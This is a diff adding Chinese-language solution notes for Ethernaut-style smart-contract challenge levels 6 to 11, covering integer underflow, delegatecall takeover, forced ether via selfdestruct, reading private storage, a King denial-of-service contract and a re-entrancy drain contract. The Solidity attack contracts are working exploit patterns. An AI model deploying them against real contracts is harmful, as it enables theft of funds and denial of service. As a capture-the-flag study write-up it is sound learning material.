@@ -41,3 +41,69 @@ contract Hack {
     }
 }
 ```
+## 6. Token
+向任意地址发送21单位的token
+```solidity
+// 直接操作uint256变量减法会有溢出问题
+require(balances[msg.sender] - _value >= 0);
+```
+## 7.Delegation
+利用下面的代码完成代理调用
+```solidity
+(bool result,) = address(delegate).delegatecall(msg.data);
+```
+向Delegation合约发送0eth, tx的data部分为pwn的方法id
+
+## 8. Force
+使用selfdestruct销毁自建合约, 向目标合约发送eth
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Hack {
+    constructor() payable public {
+        selfdestruct(0x888Eaa51Cd5E643DFc19b594DA803362c5265B7b);
+    }
+}
+```
+## 9. Vault
+使用函数w3.eth.get_storage_at读取对应slot值, 获取password, 调用unlock函数解锁
+
+## 10. King
+使用合约向目标合约转0.001eth, 成为新的king, 其他人再尝试获得king会因为transfer不成功而失败
+注意要使用低级调用call函数, 当调用数据为空时, 会自动调用目标合约的receive函数
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Hack {
+    constructor() payable public {
+        (bool success, ) = 0xaD5Ae7Ec24Ae99e2971F5f0D5c21DCBe24189962.call{value:msg.value}("");
+        require(success, "failed");
+    }
+}
+```
+## 11. Re-entrancy
+目标合约的withdraw函数先转账再扣除余额, 引发重入攻击
+攻击合约实现receive函数, 当目标合约的余额大于0时, 可以继续递归调用withdraw函数提取资金
+```solidity
+// 部署合约附带0.001e
+contract Hack {
+    Reentrance r = Reentrance(0xFAe73a7Df5253a2a8b7e32987866c2B157861371);
+
+    constructor() payable public {
+        r.donate{value: msg.value}(address(this));
+    }
+
+    function hack() public {
+        r.withdraw(r.balanceOf(address(this)));
+        selfdestruct(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f);
+    }
+
+    receive() external payable { 
+        if (address(r).balance > 0) {
+            r.withdraw(r.balanceOf(address(this)));
+        }
+     }
+}
+```
